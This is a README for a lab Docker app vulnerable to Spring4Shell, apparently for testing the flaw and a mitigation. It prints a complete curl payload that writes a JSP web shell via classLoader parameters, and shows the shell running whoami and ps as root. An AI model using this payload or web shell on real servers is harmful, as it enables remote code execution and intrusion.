# Spring4Shell PoC Application

- [Spring Framework RCE, Early Announcement
](https://spring.io/blog/2022/03/31/spring-framework-rce-early-announcement) - Spring
- [Spring4Shell: Security Analysis of the latest Java RCE '0-day' vulnerabilities in Spring
](https://github.com/lunasec-io/lunasec/blob/master/docs/blog/2022-03-30-spring-core-rce.mdx) - LunaSec

## Getting started

### Run application

```bash
$ ./gradlew clean build -i
```

```bash
$ docker build . -t spring4shell
$ docker run -p 8080:8080 --name spring4shell --rm spring4shell
```

### Exploit

- [BobTheShoplifter/Spring4Shell-POC](https://github.com/BobTheShoplifter/Spring4Shell-POC)
- [craig/SpringCore0day](https://github.com/craig/SpringCore0day)

```bash
$ pip install -r requirements.txt
```

```bash
$ ./exploit.py --url http://localhost:8080/rce/greeting
[✘] http://localhost:8080/rce/greeting Not Vulnerable!
```

### Application log

```bash
# BinderControllerAdvice 설정이 없을 때
2022-04-04 10:56:02.632  INFO 1 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
2022-04-04 10:56:02.634  INFO 1 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 1 ms
04-Apr-2022 10:56:05.099 INFO [Catalina-utility-1] org.apache.catalina.startup.HostConfig.deployDirectory Deploying web application directory [/usr/local/tomcat/webapps/ROOT]
04-Apr-2022 10:56:05.123 INFO [Catalina-utility-1] org.apache.catalina.startup.HostConfig.deployDirectory Deployment of web application directory [/usr/local/tomcat/webapps/ROOT] has finished in [23] ms

# BinderControllerAdvice 설정이 있을 때
2022-04-04 10:56:02.632  INFO 1 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Initializing Servlet 'dispatcherServlet'
2022-04-04 10:56:02.634  INFO 1 --- [nio-8080-exec-1] o.s.web.servlet.DispatcherServlet        : Completed initialization in 1 ms
```

```bash
$ docker exec -it spring4shell cat /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp

$ ./exploit.py --url http://localhost:8080/tomcatwar.jsp
Vulnerable, shell ip:http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami

$ curl "http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=whoami" --output -
root

$ curl "http://localhost:8080/tomcatwar.jsp?pwd=j&cmd=ps" --output -
  PID TTY          TIME CMD
    1 ?        00:00:19 java
   99 ?        00:00:00 ps
```

- [Spring4Shell: The zero-day RCE in the Spring Framework explained
](https://snyk.io/blog/spring4shell-zero-day-rce-spring-framework-explained/) - Snyk

```bash
$ curl -X POST \
    -H "pre:<%" \
    -H "post:;%>" \
    -F 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{pre}i out.println("HACKED" + (2 + 5))%{post}i' \
    -F 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
    -F 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
    -F 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar' \
    -F 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
    http://localhost:8080/rce/greeting

$ curl "http://localhost:8080/tomcatwar.jsp"
HACKED7

$ docker exec -it spring4shell cat /usr/local/tomcat/webapps/ROOT/tomcatwar.jsp
<% out.println("HACKED" + (2 + 5));%>
```
